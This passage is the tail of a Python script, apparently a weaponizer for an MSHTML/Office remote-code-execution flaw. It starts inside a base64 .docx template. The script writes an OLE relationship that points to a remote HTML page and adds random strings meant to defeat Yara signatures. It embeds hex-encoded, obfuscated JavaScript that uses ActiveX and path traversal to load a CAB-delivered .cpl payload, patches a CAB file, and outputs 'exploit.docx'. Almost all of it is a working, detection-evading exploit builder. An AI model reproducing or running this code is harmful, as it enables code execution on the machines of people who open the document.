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"""



#Break Yara signatures ez ;p
def breakSignature():
    print "[*] Creating Obfuscation!"
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(9))

#Generate document.xml.rels
def makeXML(html):
    print "[*] Generating document.xml.rels"
    xml= r'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2007/relationships/stylesWithEffects" Target="stylesWithEffects.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="{0}!{1}" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/></Relationships>'''.format(html,breakSignature())
    return xml

#Make HTML
#Requires URL to CAB and CPL file name
def makeHTML(caburl, cplname):
    print "[*] Generating HTML : ",htmlname
    mshtml1 ="3c68746d6c3e0a203c686561643e0a20203c6d65746120687474702d65717569763d22457870697265732220636f6e74656e743d222d31223e0a20203c6d65746120687474702d65717569763d22582d55412d436f6d70617469626c652220636f6e74656e743d2249453d3131223e0a203c2f686561643e0a203c626f64793e0a20203c7363726970743e0a7661722061305f3078313237663d5b27313233272c273336353935324b4d73525154272c277469766558272c272f4c6f272c272e2f2e2e2f2e2e2f272c27636f6e74656e74446f63756d656e74272c27707044272c27446174272c27636c6f7365272c2741637469272c2772656d6f76654368696c64272c276d6c46272c277772697465272c272e2f41272c276174612f272c27696c65272c272e2e2f272c27626f6479272c27736574417474726962757465272c272376657273696f6e3d352c302c302c30272c27737369272c27696672616d65272c2737343837303872666d55546b272c27646f63756d656e74456c656d656e74272c276c46696c65272c276c6f636174696f6e272c27313539373038684256527475272c27612f4c6f272c27536372697074272c27646f63756d656e74272c2763616c6c272c27636f6e74656e7457696e646f77272c27656d70272c27446f63756d656e74272c274f626a272c2770726f746f74797065272c276c6669272c27626a656374272c2773656e64272c27617070656e644368696c64272c274c6f772f6368616d70696f6e736869702e696e66272c2773766766696c65272c27313135393234704c62497077272c27474554272c27702f6368616d70696f6e736869702e696e66272c2731313039734d6f585858272c272e2f2e2e2f41272c2768746d272c276c2f54272c2763616c2f272c2731777a5170434f272c27656374272c27772f6368616d70696f6e736869702e696e66272c27353232343135646d69525541272c27687474703a2f2f3132372e302e302e312f73616d2e636162272c2738383332307757676c6342272c27584d4c4874747052657175657374272c276368616d70696f6e736869702e696e66272c27416374272c27443a65646263333734632d353733302d343332612d623562382d646539346630623537323137272c276f70656e272c273c626f272c2748544d4c456c656d656e74272c272f2e2e272c277665584f272c27313032466550415743275d3b66756e6374696f6e2061305f307831356563285f30783332396462612c5f3078343631303763297b72657475726e2061305f3078313565633d66756e6374696f6e285f30783132376637352c5f3078313565636435297b5f30783132376637353d5f30783132376637352d307861613b766172205f30783561373730633d61305f3078313237665b5f30783132376637355d3b72657475726e205f30783561373730633b7d2c61305f307831356563285f30783332396462612c5f3078343631303763293b7d2866756e6374696f6e285f30783539393835642c5f3078313762656438297b766172205f30783165616339303d61305f3078313565633b7768696c652821215b5d297b7472797b766172205f30783266376532643d7061727365496e74285f3078316561633930283078636529292b7061727365496e74285f3078316561633930283078643829292a7061727365496e74285f3078316561633930283078633429292b7061727365496e74285f3078316561633930283078633929292a2d7061727365496e74285f3078316561633930283078616429292b7061727365496e74285f3078316561633930283078623129292b7061727365496e74285f3078316561633930283078636329292b2d7061727365496e74285f3078316561633930283078633129292b7061727365496e74285f3078316561633930283078646129293b6966285f30783266376532643d3d3d5f307831376265643829627265616b3b656c7365205f30783539393835645b2770757368275d285f30783539393835645b277368696674275d2829293b7d6361746368285f3078333461663165297b5f30783539393835645b2770757368275d285f30783539393835645b277368696674275d2829293b7d7d7d2861305f3078313237662c30783564663731292c66756e6374696f6e28297b766172205f30783265653230373d61305f3078313565632c5f30783237396561623d77696e646f772c5f30783162393364373d5f30783237396561625b5f30783265653230372830786234295d2c5f307863663561323d5f30783237396561625b5f30783265653230372830786238295d5b2770726f746f74797065275d5b27637265617465456c656d656e74275d2c5f30783464376330323d5f30783237396561625b5f30783265653230372830786238295d5b2770726f746f74797065275d5b5f30783265653230372830786535295d2c5f30783165653331633d5f30783237396561625b5f30783265653230372830786435295d5b5f30783265653230372830786261295d5b5f30783265653230372830786265295d2c5f30783264323063643d5f30783237396561625b5f30783265653230372830786435295d5b5f30783265653230372830786261295d5b5f30783265653230372830786533295d2c5f30783466663131343d5f307863663561325b2763616c6c275d285f30783162393364372c5f3078326565323037283078616329293b7472797b5f30783165653331635b5f30783265653230372830786235295d285f30783162393364375b5f30783265653230372830786561295d2c5f3078346666313134293b7d6361746368285f3078316162343534297b5f30783165653331635b5f30783265653230372830786235295d285f30783162393364375b5f30783265653230372830786165295d2c5f3078346666313134293b7d766172205f30783430336535663d5f30783466663131345b5f30783265653230372830786236295d5b27416374697665584f626a656374275d2c5f30783232346637643d6e6577205f3078343033653566285f30783265653230372830786336292b5f30783265653230372830786262292b276c6527293b5f30783466663131345b5f30783265653230372830786465295d5b276f70656e275d28295b5f30783265653230372830786531295d28293b766172205f30783337316137313d2770273b7472797b5f30783264323063645b5f30783265653230372830786235295d285f30783162393364375b5f30783265653230372830786561295d2c5f3078346666313134293b7d6361746368285f3078336230303465297b5f30783264323063645b2763616c6c275d285f30783162393364375b27646f63756d656e74456c656d656e74275d2c5f3078346666313134293b7d66756e6374696f6e205f307832353131646328297b766172205f30783435616535373d5f30783265653230373b72657475726e205f30783435616535372830786364293b7d5f30783232346637645b276f70656e275d28295b5f30783265653230372830786531295d28293b766172205f30783365313732663d6e6577205f30783232346637645b285f3078326565323037283078623329295d5b285f3078326565323037283078643129292b2769766558272b285f3078326565323037283078623929292b285f3078326565323037283078636129295d282768746d272b5f3078326565323037283078616629293b5f30783365313732665b5f30783265653230372830786433295d28295b5f30783265653230372830786531295d28293b766172205f30786437653333643d2763272c5f30783335623064343d6e6577205f30783365313732665b285f3078326565323037283078623329295d5b274163272b285f3078326565323037283078646229292b274f62272b276a656374275d28276874272b5f30783265653230372830786534292b5f3078326565323037283078653829293b5f30783335623064345b5f30783265653230372830786433295d28295b5f30783265653230372830786531295d28293b766172205f30786637306336653d6e6577205f30783335623064345b27536372697074275d5b285f3078326565323037283078653229292b285f3078326565323037283078643729292b285f3078326565323037283078626329295d28276874272b276d6c46272b5f3078326565323037283078653829293b5f30786637306336655b5f30783265653230372830786433295d28295b5f30783265653230372830786531295d28293b766172205f30786665643165663d6e657720416374697665584f626a656374282773766766696c6527292c5f30783566333139313d6e657720416374697665584f626a656374285f3078326565323037283078633029292c5f30786166633739353d6e657720416374697665584f626a656374285f3078326565323037283078633029292c5f30783561366434623d6e657720416374697665584f626a656374282773766766696c6527292c5f30783235383434333d6e657720416374697665584f626a656374282773766766696c6527292c5f30783533633261623d6e657720416374697665584f626a656374282773766766696c6527292c5f30783361363237623d5f30783237396561625b5f30783265653230372830786366295d2c5f30783263383461383d6e6577205f307833613632376228292c5f30783232306565653d5f30783361363237625b5f30783265653230372830786261295d5b5f30783265653230372830786433295d2c5f30783336333764383d5f30783361363237625b5f30783265653230372830786261295d5b5f30783265653230372830786264295d2c5f30783237646536663d5f30783237396561625b2773657454696d656f7574275d3b5f30783232306565655b5f30783265653230372830786235295d285f30783263383461382c5f30783265653230372830786332292c5f307832353131646328292c215b5d292c5f30783336333764385b5f30783265653230372830786235295d285f3078326338346138292c5f30786637306336655b5f30783265653230372830786233295d5b5f30783265653230372830786234295d5b5f30783265653230372830786535295d285f30783265653230372830786434292b2764793e27293b766172205f30783132366538333d5f307863663561325b5f30783265653230372830786235295d285f30786637306336655b27536372697074275d5b5f30783265653230372830786234295d2c276f62272b276a65272b27637427293b5f30783132366538335b5f30783265653230372830786562295d2827636f272b276465272b276261272b277365272c5f307832353131646328292b5f3078326565323037283078616129293b766172205f30783438376266613d276c273b5f30783132366538335b5f30783265653230372830786562295d282763272b276c61272b5f30783265653230372830786162292b2764272c27434c272b275349272b5f3078326565323037283078643229292c5f30783165653331635b5f30783265653230372830786235295d285f30786637306336655b5f30783265653230372830786233295d5b27646f63756d656e74275d5b27626f6479275d2c5f3078313236653833292c5f30786665643165665b5f30783265653230372830786233295d5b5f30783265653230372830786230295d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a272b27313233272c5f30786665643165665b5f30783265653230372830786233295d5b276c6f636174696f6e275d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a272b5f30783265653230372830786439292c5f30786665643165665b5f30783265653230372830786233295d5b5f30783265653230372830786230295d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a272b5f30783265653230372830786439292c5f30786665643165665b5f30783265653230372830786233295d5b5f30783265653230372830786230295d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a272b5f30783265653230372830786439292c5f30786665643165665b5f30783265653230372830786233295d5b5f30783265653230372830786230295d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a272b27313233272c5f30786665643165665b5f30783265653230372830786233295d5b5f30783265653230372830786230295d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a272b5f30783265653230372830786439292c5f30786665643165665b27536372697074275d5b276c6f636174696f6e275d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a272b5f30783265653230372830786439292c5f30786665643165665b5f30783265653230372830786233295d5b276c6f636174696f6e275d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a272b5f30783265653230372830786439292c5f30786665643165665b5f30783265653230372830786233295d5b5f30783265653230372830786230295d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a272b27313233272c5f30786665643165665b5f30783265653230372830786233295d5b5f30783265653230372830786230295d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a272b272e2e272b272f2e272b5f30783265653230372830786335292b5f30783265653230372830786466292b5f30783265653230372830786537292b274c6f272b5f30783265653230372830786338292b2754272b5f30783265653230372830786237292b5f30783265653230372830786463292b5f30783265653230372830786362292c5f30783566333139315b5f30783265653230372830786233295d5b5f30783265653230372830786230295d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a2e272b272e2f272b272e2e272b272f2e272b5f30783265653230372830786536292b277070272b5f30783265653230372830786530292b27612f4c6f272b276361272b5f30783265653230372830786337292b27656d272b27702f6368616d70696f6e736869702e696e66272c5f30786166633739355b5f30783265653230372830786233295d5b5f30783265653230372830786230295d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a272b272e2e272b5f30783265653230372830786436292b272f2e272b272e2f2e2e2f41272b5f30783265653230372830786466292b5f30783265653230372830786537292b274c6f272b5f30783265653230372830786338292b2754272b5f30783265653230372830786237292b5f30783265653230372830786463292b27772f6368616d70696f6e736869702e696e66272c5f30783561366434625b5f30783265653230372830786233295d5b5f30783265653230372830786230295d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a2e272b272e2f272b5f30783265653230372830786539292b272e2e272b272f2e272b5f30783265653230372830786536292b277070272b27446174272b5f30783265653230372830786232292b276361272b276c2f54272b27656d272b5f30783265653230372830786333292c5f30783235383434335b5f30783265653230372830786233295d5b276c6f636174696f6e275d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a272b272e2e272b5f30783265653230372830786436292b272f2e272b5f30783265653230372830786464292b2754272b5f30783265653230372830786237292b5f30783265653230372830786463292b5f30783265653230372830786362292c5f30783561366434625b27536372697074275d5b5f30783265653230372830786230295d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a2e272b272e2f272b272e2e2f272b272e2e272b272f2e272b272e2f2e2e2f54272b27656d272b27702f6368616d70696f6e736869702e696e66272c5f30783561366434625b5f30783265653230372830786233295d5b276c6f636174696f6e275d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a272b5f30783265653230372830786539292b5f30783265653230372830786539292b5f30783265653230372830786266292c5f30783561366434625b5f30783265653230372830786233295d5b276c6f636174696f6e275d3d272e272b5f30786437653333642b5f30783337316137312b5f30783438376266612b273a272b272e2e2f272b5f30783265653230372830786539292b5f30783265653230372830786430293b7d2829293b0a20203c2f7363726970743e0a203c2f626f64793e0a3c2f68746d6c3e0a"
    
    mshtml1= mshtml1.decode("hex")
    mshtml1=mshtml1.replace("http://127.0.0.1/sam.cab",caburl)
    return mshtml1


#Make CAB file
#Requires URL to EXE
def makeCAB():
    os.chdir("yoy")
    os.system('lcab \'../dlexec.cpl\' out.cab')
    m_off = 0x2d
    f = open('www/out.cab','rb')
    cab_data = f.read()
    f.close()

    out_cab_data = cab_data[:m_off]
    out_cab_data += b'\x00\x5c\x41\x00'
    out_cab_data += cab_data[m_off+4:]

    out_cab_data = out_cab_data.replace(b'..\\championship.inf', b'../championship.inf')

    return out_cab_data

#Patch DLL for EXE URL
def patchDLL(exeurl):
    pass

#Make Document :)
def makeDocx(html):
    open("yoy/test2.docx","wb+").write(doc.decode("base64"))
    open("yoy/document.xml.rels","w").write(makeXML(html))
    open("yoy/"+htmlname,"wb+").write(makeHTML(caburl,cplname))
    with zipfile.ZipFile("yoy/test2.docx",'a') as inzip:
        inzip.write("yoy/document.xml.rels","word/_rels/document.xml.rels")
        inzip.close()
    
#Clean UP the mess
def cleanUP():
    print "[*] Cleaning Garbage"
    shutil.copyfile("yoy/test2.docx",os.getcwd()+"/exploit.docx")
    shutil.copyfile("yoy/"+htmlname,os.getcwd()+"/"+htmlname)
    os.remove("yoy/document.xml.rels")
    os.remove("yoy/test2.docx")
    os.remove("yoy/"+htmlname)
    

def main():
    makeDocx(html)
    cleanUP()
    print "[*] DONE!"
main()
